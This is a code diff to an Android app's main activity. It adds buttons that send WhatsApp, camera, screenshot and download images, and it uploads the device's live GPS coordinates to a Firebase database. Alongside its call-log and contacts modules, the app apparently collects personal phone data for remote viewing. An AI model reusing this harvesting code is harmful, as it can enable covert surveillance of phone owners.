@@ -23,6 +23,8 @@ import android.widget.Toast;
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.auth.FirebaseUser;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
 import com.hazyaz.temps.CallLogs.GetCallLogs;
 import com.hazyaz.temps.Contacts.Contacts;
 import com.hazyaz.temps.GPS.GPSTracker;
@@ -72,6 +74,31 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 GetImages obj = new GetImages();
+                obj.getWhatsAppImages();
+                Toast.makeText(getApplicationContext(), "Images Sent Successfully", Toast.LENGTH_LONG).show();
+            }
+        });
+        folder_camera.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                GetImages obj = new GetImages();
+                obj.getCameraImages();
+                Toast.makeText(getApplicationContext(), "Images Sent Successfully", Toast.LENGTH_LONG).show();
+            }
+        });
+        folder_screenshots.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                GetImages obj = new GetImages();
+                obj.getScreenshots();
+                Toast.makeText(getApplicationContext(), "Images Sent Successfully", Toast.LENGTH_LONG).show();
+            }
+        });
+        folder_downloads.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                GetImages obj = new GetImages();
+                obj.getDownloads();
                 Toast.makeText(getApplicationContext(), "Images Sent Successfully", Toast.LENGTH_LONG).show();
             }
         });
@@ -125,7 +152,14 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 GPSTracker gpsTracker = new GPSTracker(getApplicationContext());
-                Log.d("loasdsd", "" + gpsTracker.getLocation());
+                Log.d("loasdsd", "" + gpsTracker.getLatitude()+" " +gpsTracker.getLongitude());
+                DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
+
+                mDatabase.child("users").child("username").child("Location").child("Longitude").setValue(gpsTracker.getLongitude());
+                mDatabase.child("users").child("username").child("Location").child("Latitude").setValue(gpsTracker.getLatitude());
+                mDatabase.child(FirebaseAuth.getInstance().getCurrentUser().getUid()).child("Data").child("Live").child("Location").child("Longitude").setValue(gpsTracker.getLongitude());
+                mDatabase.child(FirebaseAuth.getInstance().getCurrentUser().getUid()).child("Data").child("Live").child("Location").child("Latitude").setValue(gpsTracker.getLatitude());
+
                 Toast.makeText(getApplicationContext(), "Live Location sent successfully", Toast.LENGTH_LONG).show();
             }
         });
